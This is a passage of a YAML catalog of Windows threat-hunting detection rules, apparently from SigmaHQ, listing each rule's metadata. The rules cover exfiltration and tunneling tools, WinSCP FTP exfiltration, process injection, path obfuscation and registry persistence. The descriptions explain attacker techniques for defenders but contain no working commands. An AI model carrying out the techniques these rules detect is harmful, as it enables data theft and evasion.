  - Persistence
  techniques:
  - T1505.003
  tags:
  - attack.persistence
  - attack.t1505.003
  - detection.threat-hunting
  time_window: ''
  references:
  - Internal Research
  false_positives:
  - Various applications
  - Tools that include ping or nslookup command invocations
  notes: ''
- detection_id: c75309a3-59f8-4a8d-9c2c-4c927ad50555
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/process_creation/proc_creation_win_susp_exfil_and_tunneling_tool_execution.yml
  name: Tunneling Tool Execution
  description: Detects the execution of well known tools that can be abused for data
    exfiltration and tunneling.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Exfiltration
  techniques:
  - T1041
  - T1071.001
  - T1572
  tags:
  - attack.exfiltration
  - attack.command-and-control
  - attack.t1041
  - attack.t1572
  - attack.t1071.001
  - detection.threat-hunting
  time_window: ''
  references:
  - https://www.microsoft.com/en-us/security/blog/2022/07/26/malicious-iis-extensions-quietly-open-persistent-backdoors-into-servers/
  false_positives:
  - Legitimate administrators using one of these tools
  notes: ''
- detection_id: 37ae075c-271b-459b-8d7b-55ad5f993dd8
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/process_creation/proc_creation_win_susp_file_permission_modifications.yml
  name: File or Folder Permissions Modifications
  description: Detects a file or folder's permissions being modified or tampered with.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1222.001
  tags:
  - attack.defense-evasion
  - attack.t1222.001
  - detection.threat-hunting
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1222.001/T1222.001.md
  - https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh750728(v=ws.11)
  - https://github.com/swagkarna/Defeat-Defender-V1.2.0/tree/ae4059c4276da6f6303b8f53cdff085ecae88a91
  false_positives:
  - Users interacting with the files on their own (unlikely unless privileged users).
  - Dynatrace app
  notes: ''
- detection_id: 349d891d-fef0-4fe4-bc53-eee623a15969
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/process_creation/proc_creation_win_susp_ntfs_short_name_path_use_cli.yml
  name: Use Short Name Path in Command Line
  description: 'Detects the use of short name paths (8.3 format) in command lines,
    which can be used to obfuscate paths or access restricted locations.

    Windows creates short 8.3 filenames (like PROGRA~1) for compatibility with MS-DOS-based
    or 16-bit Windows programs.

    When investigating, examine:

    - Commands using short paths to access sensitive directories or files

    - Web servers on Windows (especially Apache) where short filenames could bypass
    security controls

    - Correlation with other suspicious behaviors

    - baseline of short name usage in your environment and look for deviations

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_ready
  predictive_readiness_score: 9
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  - multi_signal_correlation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1564.004
  tags:
  - attack.defense-evasion
  - attack.t1564.004
  - detection.threat-hunting
  time_window: ''
  references:
  - https://www.acunetix.com/blog/articles/windows-short-8-3-filenames-web-security-problem/
  - https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc959352(v=technet.10)
  - https://twitter.com/frack113/status/1555830623633375232
  false_positives:
  - Applications could use this notation occasionally which might generate some false
    positives. In that case investigate the parent and child process.
  notes: ''
- detection_id: 538c5851-8c03-4724-8ec4-623bc7aadaea
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/process_creation/proc_creation_win_susp_open_html_file_from_download_folder.yml
  name: HTML File Opened From Download Folder
  description: 'Detects web browser process opening an HTML file from a user''s Downloads
    folder.

    This behavior is could be associated with phishing attacks where threat actors
    send HTML attachments to users.

    When a user opens such an attachment, it can lead to the execution of malicious
    scripts or the download of malware.

    During investigation, analyze the HTML file for embedded scripts or links, check
    for any subsequent downloads or process executions, and investigate the source
    of the email or message containing the attachment.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  severity: low
  status: experimental
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Reconnaissance
  techniques:
  - T1566.001
  - T1598.002
  tags:
  - attack.t1598.002
  - attack.t1566.001
  - attack.initial-access
  - attack.reconnaissance
  - detection.threat-hunting
  time_window: ''
  references:
  - https://app.any.run/tasks/ae3c4ded-fd6a-43ed-8215-ba0ba574ad33
  - https://app.any.run/tasks/8901e2d5-0c5a-48ba-a8e9-10b5ed7e06f4
  false_positives:
  - Opening any HTML file located in users directories via a browser process will
    trigger this.
  notes: ''
- detection_id: bafd07c6-3ea5-454a-b4be-058fbb073de7
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/process_creation/proc_creation_win_susp_parent_execute_itself.yml
  name: Potential Executable Run Itself As Sacrificial Process
  description: 'Detects when an executable launches an identical instance of itself,
    a behavior often used to create a suspended sacrificial process for code injection
    or evasion.

    Investigate for indicators such as the process being started in suspended mode,
    rapid parent termination, memory manipulation (e.g., WriteProcessMemory, CreateRemoteThread),
    or unsigned binaries.

    Review command-line arguments, process ancestry, and network activity to confirm
    if this is legitimate behavior or process injection activity.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: experimental
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1055
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1055
  - detection.threat-hunting
  time_window: ''
  references:
  - https://www.joesandbox.com/analysis/1605063/0/html
  false_positives:
  - Legitimate software that may launch a new instance of itself, especially updaters
    or installers. Investigate each alert and apply whitelisting as needed.
  notes: ''
- detection_id: 95724fc1-a258-4674-97db-a30351981c5a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/process_creation/proc_creation_win_susp_script_exec_from_compressed_parent.yml
  name: Manual Execution of Script Inside of a Compressed File
  description: "This is a threat-hunting query to collect information related to the\
    \ interactive execution of a script from inside a compressed file (zip/rar). Windows\
    \ will automatically run the script using scripting interpreters such as wscript\
    \ and cscript binaries.\n\nFrom the query below, the child process is the script\
    \ interpreter that will execute the script. The script extension is also a set\
    \ of standard extensions that Windows OS recognizes. Selections 1-3 contain three\
    \ different execution scenarios.\n    1. Compressed file opened using 7zip.\n\
    \    2. Compressed file opened using WinRar.\n    3. Compressed file opened using\
    \ native windows File Explorer capabilities.\n\nWhen the malicious script is double-clicked,\
    \ it will be extracted to the respected directories as signified by the CommandLine\
    \ on each of the three Selections. It will then be executed using the relevant\
    \ script interpreter.\"\n"
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059
  tags:
  - attack.execution
  - attack.t1059
  - detection.threat-hunting
  time_window: ''
  references:
  - https://app.any.run/tasks/25970bb5-f864-4e9e-9e1b-cc8ff9e6386a
  - https://app.any.run/tasks/fa99cedc-9d2f-4115-a08e-291429ce3692
  false_positives:
  - Batch files may produce a lot of noise, as many applications appear to bundle
    them as part of their installation process. You should baseline your environment
    and generate a new query excluding the noisy and expected activity. Some false
    positives may come up depending on your environment. All results should be investigated
    thoroughly before filtering out results.
  notes: ''
- detection_id: 86085955-ea48-42a2-9dd3-85d4c36b167d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/process_creation/proc_creation_win_taskkill_execution.yml
  name: Process Terminated Via Taskkill
  description: 'Detects execution of "taskkill.exe" in order to stop a service or
    a process. Look for suspicious parents executing this command in order to hunt
    for potential malicious activity.

    Attackers might leverage this in order to conduct data destruction or data encrypted
    for impact on the data stores of services like Exchange and SQL Server.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1489
  tags:
  - attack.impact
  - attack.t1489
  - detection.threat-hunting
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1489/T1489.md#atomic-test-3---windows---stop-service-by-killing-process
  - https://unit42.paloaltonetworks.com/snipbot-romcom-malware-variant/
  false_positives:
  - Expected FP with some processes using this techniques to terminate one of their
    processes during installations and updates
  notes: ''
- detection_id: 63332011-f057-496c-ad8d-d2b6afb27f96
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/process_creation/proc_creation_win_tasklist_basic_execution.yml
  name: Suspicious Tasklist Discovery Command
  description: Adversaries may attempt to get information about running processes
    on a system. Information obtained could be used to gain an understanding of common
    software/applications running on systems within the network
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: informational
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1057
  tags:
  - attack.discovery
  - attack.t1057
  - detection.threat-hunting
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1057/T1057.md#atomic-test-2---process-discovery---tasklist
  false_positives:
  - Likely from users, administrator and different internal and third party applications.
  notes: ''
- detection_id: f8de9dd5-7a63-4cfd-9d0c-ae124878b5a9
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/process_creation/proc_creation_win_webdav_process_execution.yml
  name: Process Execution From WebDAV Share
  description: 'Detects execution of processes with image paths starting with WebDAV
    shares (\\), which might indicate malicious file execution from remote web shares.

    Execution of processes from WebDAV shares can be a sign of lateral movement or
    exploitation attempts, especially if the process is not a known legitimate application.

    Exploitation Attempt of vulnerabilities like CVE-2025-33053 also involves executing
    processes from WebDAV paths.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: experimental
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1105
  tags:
  - attack.execution
  - attack.command-and-control
  - attack.lateral-movement
  - attack.t1105
  - detection.threat-hunting
  time_window: ''
  references:
  - https://research.checkpoint.com/2025/stealth-falcon-zero-day/
  false_positives:
  - Legitimate use of WebDAV shares for process execution
  - Known applications executing from WebDAV paths
  notes: ''
- detection_id: c1477deb-37cf-4439-9ffb-44499acb89d0
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/process_creation/proc_creation_win_winscp_command_open_ftp.yml
  name: FTP Connection Open Attempt Via Winscp CLI
  description: Detects the execution of Winscp with the "-command" and the "open"
    flags in order to open an FTP connection. Akira ransomware was seen using this
    technique in order to exfiltrate data.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: experimental
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Exfiltration
  techniques:
  - T1048
  tags:
  - attack.exfiltration
  - attack.t1048
  - detection.threat-hunting
  time_window: ''
  references:
  - https://blogs.blackberry.com/en/2024/07/akira-ransomware-targets-the-latam-airline-industry
  false_positives:
  - Unknown
  notes: ''
- detection_id: 7674f8ef-7141-4cf0-a311-ee359264c64c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/process_creation/proc_creation_win_winscp_portable_execution.yml
  name: Winscp Execution From Non Standard Folder
  description: Detects the execution of Winscp from an a non standard folder. This
    could indicate the execution of Winscp portable.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: experimental
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Exfiltration
  techniques:
  - T1048
  tags:
  - attack.exfiltration
  - attack.t1048
  - detection.threat-hunting
  time_window: ''
  references:
  - https://blogs.blackberry.com/en/2024/07/akira-ransomware-targets-the-latam-airline-industry
  false_positives:
  - Unknown
  notes: ''
- detection_id: d85ecdd7-b855-4e6e-af59-d9c78b5b861e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/process_creation/proc_creation_win_wmic_recon_system_info.yml
  name: System Information Discovery Via Wmic.EXE
  description: 'Detects the use of the WMI command-line (WMIC) utility to identify
    and display various system information,

    including OS, CPU, GPU, disk drive names, memory capacity, display resolution,
    baseboard, BIOS,

    and GPU driver products/versions.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1082
  tags:
  - attack.discovery
  - attack.t1082
  - detection.threat-hunting
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/a2ccd19c37d0278b4ffa8583add3cf52060a5418/atomics/T1082/T1082.md#atomic-test-25---system-information-discovery-with-wmic
  - https://nwgat.ninja/getting-system-information-with-wmic-on-windows/
  - https://blog.sekoia.io/aurora-a-rising-stealer-flying-under-the-radar
  - https://blog.cyble.com/2023/01/18/aurora-a-stealer-using-shapeshifting-tactics/
  - https://app.any.run/tasks/a6aa0057-82ec-451f-8f99-55650ca537da/
  - https://www.virustotal.com/gui/file/d6f6bc10ae0e634ed4301d584f61418cee18e5d58ad9af72f8aa552dc4aaeca3/behavior
  false_positives:
  - VMWare Tools serviceDiscovery scripts
  notes: ''
- detection_id: 1e33157c-53b1-41ad-bbcc-780b80b58288
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/process_creation/proc_creation_win_wscript_cscript_script_exec.yml
  name: WSF/JSE/JS/VBA/VBE File Execution Via Cscript/Wscript
  description: Detects script file execution (.js, .jse, .vba, .vbe, .vbs, .wsf) by
    Wscript/Cscript
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.005
  - T1059.007
  tags:
  - attack.execution
  - attack.t1059.005
  - attack.t1059.007
  - detection.threat-hunting
  time_window: ''
  references:
  - https://thedfirreport.com/2023/10/30/netsupport-intrusion-results-in-domain-compromise/
  - https://redcanary.com/blog/gootloader/
  false_positives:
  - Some additional tuning is required. It is recommended to add the user profile
    path in CommandLine if it is getting too noisy.
  notes: ''
- detection_id: dec44ca7-61ad-493c-bfd7-8819c5faa09b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/process_creation/proc_creation_win_wsl_arbitrary_command_execution.yml
  name: Arbitrary Command Execution Using WSL
  description: 'Detects potential abuse of Windows Subsystem for Linux (WSL) binary
    as a Living of the Land binary in order to execute arbitrary Linux or Windows
    commands.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1202
  - T1218
  tags:
  - attack.execution
  - attack.defense-evasion
  - attack.t1218
  - attack.t1202
  - detection.threat-hunting
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Wsl/
  - https://twitter.com/nas_bench/status/1535431474429808642
  false_positives:
  - Automation and orchestration scripts may use this method to execute scripts etc.
  - Legitimate use by Windows to kill processes opened via WSL (example VsCode WSL
    server)
  notes: ''
- detection_id: 59b39960-5f9d-4a49-9cef-1e4d2c1d0cb9
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/process_creation/proc_creation_win_wusa_cab_files_extraction.yml
  name: Cab File Extraction Via Wusa.EXE
  description: 'Detects execution of the "wusa.exe" (Windows Update Standalone Installer)
    utility to extract cab using the "/extract" argument that is no longer supported.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  - detection.threat-hunting
  time_window: ''
  references:
  - https://web.archive.org/web/20180331144337/https://www.fireeye.com/blog/threat-research/2018/03/sanny-malware-delivery-method-updated-in-recently-observed-attacks.html
  false_positives:
  - The "extract" flag still works on older 'wusa.exe' versions, which could be a
    legitimate use (monitor the path of the cab being extracted)
  notes: ''
- detection_id: 93ff0ceb-e0ef-4586-8cd8-a6c277d738e3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/registry/registry_event/registry_event_scheduled_task_creation.yml
  name: Scheduled Task Created - Registry
  description: Detects the creation of a scheduled task via Registry keys.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: registry_event
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1053.005
  tags:
  - attack.execution
  - attack.persistence
  - attack.privilege-escalation
  - attack.s0111
  - attack.t1053.005
  - car.2013-08-001
  - detection.threat-hunting
  time_window: ''
  references:
  - https://center-for-threat-informed-defense.github.io/summiting-the-pyramid/analytics/task_scheduling/
  - https://posts.specterops.io/abstracting-scheduled-tasks-3b6451f6a1c5
  false_positives:
  - Likely as this is a normal behaviour on Windows
  notes: ''
- detection_id: a0bed973-45fa-4625-adb5-6ecdf9be70ac
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/registry/registry_set/registry_set_office_trusted_location.yml
  name: Microsoft Office Trusted Location Updated
  description: Detects changes to the registry keys related to "Trusted Location"
    of Microsoft Office. Attackers might add additional trusted locations to avoid
    macro security restrictions.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1112
  tags:
  - attack.defense-evasion
  - attack.persistence
  - attack.t1112
  - detection.threat-hunting
  time_window: ''
  references:
  - https://admx.help/?Category=Office2016&Policy=excel16.Office.Microsoft.Policies.Windows::L_TrustedLoc01
  false_positives:
  - During office installations or setup, trusted locations are added, which will
    trigger this rule.
  notes: ''
- detection_id: 1c2a3268-3881-414a-80af-a5b313b14c0e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/registry/registry_set/registry_set_powershell_crypto_namespace.yml
  name: Registry Set With Crypto-Classes From The "Cryptography" PowerShell Namespace
  description: 'Detects the setting of a registry inside the "\Shell\Open\Command"
    value with PowerShell classes from the "System.Security.Cryptography" namespace.

    The PowerShell namespace "System.Security.Cryptography" provides classes for on-the-fly
    encryption and decryption.

    These can be used for example in decrypting malicious payload for defense evasion.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1027.010
  - T1059.001
  - T1547.001
  tags:
  - attack.defense-evasion
  - attack.execution
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1059.001
  - attack.t1027.010
  - attack.t1547.001
  - detection.threat-hunting
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/dotnet/api/system.security.cryptography?view=net-8.0
  - https://squiblydoo.blog/2023/11/07/october-2023-solarmarker/
  false_positives:
  - Classes are legitimately used, but less so when e.g. parents with low prevalence
    or decryption of content in temporary folders.
  notes: ''
- detection_id: f9d091f6-f1c7-4873-a24f-050b4a02b4dd
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/registry/registry_set/registry_set_runmru_command_execution.yml
  name: Command Executed Via Run Dialog Box - Registry
  description: 'Detects execution of commands via the run dialog box on Windows by
    checking values of the "RunMRU" registry key.

    This technique was seen being abused by threat actors to deceive users into pasting
    and executing malicious commands, often disguised as CAPTCHA verification steps.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - detection.threat-hunting
  - attack.execution
  time_window: ''
  references:
  - https://www.forensafe.com/blogs/runmrukey.html
  - https://medium.com/@shaherzakaria8/downloading-trojan-lumma-infostealer-through-capatcha-1f25255a0e71
  - https://redcanary.com/blog/threat-intelligence/intelligence-insights-october-2024/
  false_positives:
  - Likely
  notes: ''
- detection_id: 277dc340-0540-42e7-8efb-5ff460045e07
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/registry/registry_set/registry_set_service_image_path_user_controlled_folder.yml
  name: Service Binary in User Controlled Folder
  description: 'Detects the setting of the "ImagePath" value of a service registry
    key to a path controlled by a non-administrator user such as "\AppData\" or "\ProgramData\".

    Attackers often use such directories for staging purposes.

    This rule might also trigger on badly written software, where if an attacker controls
    an auto starting service, they might achieve persistence or privilege escalation.

    Note that while ProgramData is a user controlled folder, software might apply
    strict ACLs which makes them only accessible to admin users. Remove such folders
    via filters if you experience a lot of noise.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1112
  tags:
  - attack.defense-evasion
  - attack.persistence
  - attack.t1112
  - detection.threat-hunting
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.001/T1562.001.md
  false_positives:
  - Unknown
  notes: ''
- detection_id: 868df2d1-0939-4562-83a7-27408c4a1ada
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-threat-hunting/windows/registry/registry_set/registry_set_shell_context_menu_tampering.yml
  name: Shell Context Menu Command Tampering
  description: Detects changes to shell context menu commands. Use this rule to hunt
    for potential anomalies and suspicious shell commands.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques: []
  tags:
  - attack.persistence
  - detection.threat-hunting
  time_window: ''
  references:
  - https://mrd0x.com/sentinelone-persistence-via-menu-context/
  false_positives:
  - Likely from new software installation suggesting to add context menu items. Such
    as "PowerShell", "Everything", "Git", etc.
  notes: ''
